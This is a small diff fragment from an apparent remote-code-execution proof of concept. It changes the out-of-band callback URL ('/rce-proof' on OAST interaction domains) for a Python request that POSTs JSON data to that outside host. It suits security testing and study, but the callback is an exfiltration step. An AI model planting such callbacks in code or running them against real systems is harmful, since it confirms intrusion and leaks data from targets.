@@ -26,7 +26,7 @@ try:
     }).encode()
 
     req = urllib.request.Request(
-        "https://db0mduvmie2075smjd80froropi3pen16.oast.pro/rce-proof",
+        "https://db0meq33hu6s8sl1b7104arzi3kttcqkb.oast.online/rce-proof",
         data=data,
         headers={"Content-Type": "application/json"}
     )
